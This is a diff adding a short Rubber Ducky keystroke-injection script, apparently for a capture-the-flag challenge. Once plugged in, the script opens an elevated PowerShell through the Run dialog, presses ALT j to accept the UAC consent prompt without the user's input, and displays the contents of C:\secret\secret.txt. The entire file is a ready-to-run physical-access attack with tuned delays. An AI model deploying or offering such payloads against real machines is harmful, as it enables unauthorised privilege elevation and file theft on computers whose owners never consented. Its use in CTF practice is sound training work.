@@ -1,0 +1,40 @@
+REM Rubber Ducky Script for UAC Bypass and File Reading
+REM Developed for the CTF Challenge
+
+REM Delay for system startup
+DELAY 2000
+
+REM Open the Run dialog
+WINDOWS r
+DELAY 500
+
+REM Type PowerShell command to open PowerShell with administrator privileges
+STRING powershell Start-Process powershell -Verb RunAs
+ENTER
+DELAY 1000
+
+REM Wait for the UAC prompt and accept it
+REM Note: You may need to adjust the delay time if UAC prompt takes longer to appear
+DELAY 2000
+ALT j
+DELAY 1000
+
+REM Wait for PowerShell to open with admin privileges
+REM Note: You may need to adjust the delay time if PowerShell takes longer to open
+DELAY 3000
+
+REM Change directory to the target file location
+STRING cd C:\secret
+ENTER
+DELAY 1000
+REM Read the file and output the content
+STRING Get-Content -Path "secret.txt"
+SPACE
+ENTER
+
+REM Wait for the file content to display
+REM Note: You may need to adjust the delay time if the file is larger and takes longer to display
+DELAY 3000
+
+
+
